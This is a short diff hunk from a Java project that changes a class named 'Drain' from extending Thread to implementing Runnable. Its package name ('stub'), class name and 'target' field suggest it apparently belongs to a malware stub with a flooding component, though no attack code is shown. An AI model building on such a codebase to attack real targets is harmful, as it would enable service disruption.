@@ -4,7 +4,7 @@ import java.net.URL;
 
 import com.redpois0n.stub.Constants;
 
-public class Drain extends Thread {
+public class Drain implements Runnable {
 
 	public String target;
 
